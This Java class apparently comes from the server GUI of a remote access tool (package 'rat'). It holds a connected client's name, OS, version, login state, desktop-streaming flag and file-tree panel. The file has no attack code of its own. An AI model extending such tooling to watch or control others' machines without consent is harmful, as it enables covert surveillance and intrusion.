package de.sogomn.rat.server.gui;

import de.sogomn.rat.ActiveClient;

public final class ServerClient {
	
	private String name, os, version;
	private boolean loggedIn;
	
	private boolean streamingDesktop;
	
	private DisplayPanel displayPanel;
	private FileTreePanel treePanel;
	
	final long id;
	final ActiveClient client;
	
	public ServerClient(final long id, final ActiveClient client) {
		this.id = id;
		this.client = client;
		
		displayPanel = new DisplayPanel();
		treePanel = new FileTreePanel();
	}
	
	public void logIn(final String name, final String os, final String version) {
		this.name = name;
		this.os = os;
		this.version = version;
		
		loggedIn = true;
	}
	
	public void setStreamingDesktop(final boolean streamingDesktop) {
		this.streamingDesktop = streamingDesktop;
	}
	
	public void setController(final IGuiController controller) {
		displayPanel.setController(controller);
		treePanel.setController(controller);
	}
	
	public String getName() {
		return name;
	}
	
	public String getOs() {
		return os;
	}
	
	public String getVersion() {
		return version;
	}
	
	public boolean isLoggedIn() {
		return loggedIn;
	}
	
	public boolean isStreamingDesktop() {
		return streamingDesktop;
	}
	
	public DisplayPanel getDisplayPanel() {
		return displayPanel;
	}
	
	public FileTreePanel getTreePanel() {
		return treePanel;
	}
	
}
